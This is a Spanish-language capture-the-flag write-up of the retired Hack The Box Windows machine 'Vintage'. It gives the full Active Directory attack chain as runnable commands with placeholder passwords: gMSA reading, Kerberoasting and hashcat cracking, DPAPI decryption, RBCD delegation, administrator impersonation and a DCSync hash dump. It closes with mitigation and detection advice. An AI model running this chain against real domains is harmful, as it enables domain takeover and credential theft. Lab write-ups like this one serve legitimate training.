---
machine: Vintage
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, ad, gmsa, kerberoast, dpapi, rbcd, dcsync]
---

# Vintage — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Una contraseña inicial válida para `P.Rosa` permite enumerar AD. La cuenta de equipo `FS01$` conserva la contraseña por defecto de Pre-Windows 2000 y se usa para leer la GMSA `gMSA01$`. Un Kerberoast dirigido a `svc_sql` da una contraseña débil; con ella se leen credenciales DPAPI de una cuenta administrativa. La delegación RBCD con `FS01$` lleva a DCSync.

## Reconocimiento

```bash
nmap -Pn -sCV -p53,88,135,139,389,445,464,636,3268,3269,5985 <IP>
```

- `53/88/389/445/636` identifican un DC de `vintage.htb`.
- `5985/tcp` WinRM está abierto y `139/tcp` SMB también.
- El dominio solo acepta Kerberos para la autenticación inicial.

## Enumeración

- `P.Rosa` tiene una contraseña inicial válida; con `bloodhound-python` se mapean grupos y ACLs.
- `FS01$` aparece en “Pre-Windows 2000 Compatible Access” y su contraseña es el nombre del equipo sin `$`.
- `gMSA01$` puede leerse desde esa cuenta; `svc_sql` tiene un SPN y es objetivo de Kerberoast.

## Foothold

Se usa `P.Rosa` para enumerar y `FS01$` para leer la contraseña de `gMSA01$`. Con `GetUserSPNs.py` se pide un TGS para `svc_sql` y se crackea con `hashcat -m 13100`; la cuenta resultante tiene acceso a los archivos de un usuario administrativo.

```bash
bloodhound-python -u P.Rosa -p '<INITIAL_PASSWORD>' -d vintage.htb -ns <IP> -c All
certipy-ad account read -u 'FS01$' -p '<MACHINE_PASSWORD>' -dc-ip <IP> -target dc.vintage.htb
GetUserSPNs.py vintage.htb/P.Rosa:'<INITIAL_PASSWORD>' -dc-ip <IP> -request
hashcat -m 13100 tgs.txt rockyou.txt
```

## Movimiento lateral

Con `svc_sql` se leen los blobs DPAPI de `c.neri_adm` en su perfil y se descifran con `dpapi.py`. Esa credencial administrativa permite preparar RBCD: se escribe `msDS-AllowedToActOnBehalfOfOtherIdentity` en el DC y se usa `FS01$` para pedir un ticket S4U2self/S4U2Proxy.

## Escalada de privilegios

Se configura RBCD sobre el DC para `FS01$`, se pide un ticket como `administrator` y se usa `secretsdump.py` con `-just-dc` para DCSync. Así se obtienen todos los hashes del dominio y la flag de root.

```bash
rbcd.py -delegate-from 'FS01$' -delegate-to 'DC$' -action write -dc-ip <IP> vintage.htb/c.neri_adm:'<PASSWORD>'
getST.py -spn cifs/dc.vintage.htb -impersonate administrator -dc-ip <IP> vintage.htb/'FS01$':'<MACHINE_PASSWORD>'
secretsdump.py -k -no-pass dc.vintage.htb -just-dc
```

## Evidencia

- Enumeración de AD con `P.Rosa` y lectura de `gMSA01$`.
- TGS de `svc_sql` crackeado y blobs DPAPI descifrados.
- RBCD configurado y DCSync completado.

## Lecciones aprendidas

- Las cuentas de equipo antiguas pueden conservar contraseñas predecibles.
- Una GMSA mal delegada y un SPN con contraseña débil abren el dominio.
- RBCD y DPAPI son cadenas habituales para llegar a DCSync.

## Mitigación y detección

- Rotar contraseñas de cuentas de equipo y eliminar herencias Pre-Windows 2000.
- Usar contraseñas gestionadas y revisar quién puede leer GMSA.
- Auditar `msDS-AllowedToActOnBehalfOfOtherIdentity` y las solicitudes S4U2Proxy.

## Referencias

- [0xdf — Vintage](https://0xdf.gitlab.io/2025/04/26/htb-vintage.html)
- [IppSec — Vintage](https://www.youtube.com/watch?v=-JM--KfVhpA)
- [Hack The Box — Vintage](https://app.hackthebox.com/machines/vintage)
